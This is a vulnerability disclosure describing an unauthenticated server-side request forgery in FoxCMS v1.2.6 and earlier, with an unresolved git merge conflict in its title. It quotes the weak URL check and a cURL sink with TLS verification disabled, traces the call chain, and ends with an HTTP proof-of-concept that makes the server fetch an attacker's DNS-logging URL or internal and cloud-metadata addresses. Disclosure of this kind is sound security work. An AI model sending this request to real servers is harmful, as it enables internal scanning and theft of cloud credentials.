<<<<<<< HEAD
# FoxCMS Unauthenticated SSRF via /plus/access/stat
=======
# FoxCMS Unauthenticated SSRF
>>>>>>> a28011ff593ac60a8e873e78b4d020c8c4982377

Open source address： https://github.com/qianfox/foxcms

Version： FoxCMS <= v1.2.6

Code： The `/index.php/plus/access/stat` endpoint in `Access.php` accepts a user-supplied `fp` GET parameter and passes it through `sanitizeFromPage()` which only performs a basic http/https protocol prefix check. The URL then reaches `get_url_content()` in `common.php` which executes a cURL request via `curl_exec()` with no internal IP blacklist, no cloud metadata IP filter, no SSL verification, and no redirect restriction. An unauthenticated attacker can exploit this to scan internal networks, access cloud provider metadata APIs, and attack internal services.

## Vulnerable Code
### File: `app/plus/controller/Access.php` (lines 160-216)

```php
private function sanitizeFromPage()
{
    $url = '';

    // Priority 1: GET parameter 'fp'
    if (isset($_GET['fp']) && is_string($_GET['fp'])) {
        $url = $_GET['fp'];
    }
    // Priority 2: HTTP_REFERER
    elseif (!empty($_SERVER['HTTP_REFERER'])) {
        $url = $_SERVER['HTTP_REFERER'];
    }

    if (empty($url)) {
        return '';
    }

    $url = trim($url);

    // Only allows http/https protocol — no IP blacklist
    if (!preg_match('/^https?:\/\//i', $url)) {
        return '';
    }

    // Only filters XSS-related keywords — no SSRF protection
    $decoded = urldecode($url);
    $dangerousPatterns = [
        'javascript:', 'data:', 'vbscript:',
        'onerror=', 'onload=', 'onclick=',
        'onmouseover=', 'onfocus=', 'onblur=',
        'expression\(', 'style=',
    ];
    foreach ($dangerousPatterns as $pattern) {
        if (stripos($decoded, $pattern) !== false) {
            return '';
        }
    }

    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return '';
    }

    $url = mb_substr($url, 0, 2048);

    return $url;
}
```

### File: `app/plus/controller/Access.php` (lines 222-236)

```php
private function sanitizePageTitle()
{
    $title = '未获取到标题';

    if (isset($_GET['title']) && !empty($_GET['title'])) {
        $title = $_GET['title'];
    }
    else {
        $from_page = $this->sanitizeFromPage();
        if (!empty($from_page)) {
            $title = getPageTitle($from_page);  // User-controlled URL passed here
        }
    }
    // ...
}
```

### File: `app/common.php` (lines 1407-1418)

```php
function get_url_content($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);                    // Sink: user URL directly set
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);        // SSL verification disabled
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);        // Host verification disabled
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);                                // Sink: executes arbitrary HTTP request
    return $result;
}
```

## Call Chain

```
/public/index.php/plus/access/stat?fp=http://internal-or-metadata-URL
  ↓
Access.php:stat() → sanitizeFromPage()
  ↓  Only checks http/https prefix — no IP filtering
Access.php:sanitizePageTitle() → getPageTitle($from_page)
  ↓
common.php:get_url_content($url)
  ↓
curl_setopt($ch, CURLOPT_URL, $url);   // No protocol restriction
curl_exec($ch);                         // SSRF to arbitrary target
```

## PoC
### Basic SSRF (Internal Port Scan)

```http
GET /index.php/plus/access/stat?fp=http://{YOUR_DNSLOG} HTTP/1.1
Host: {{target}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

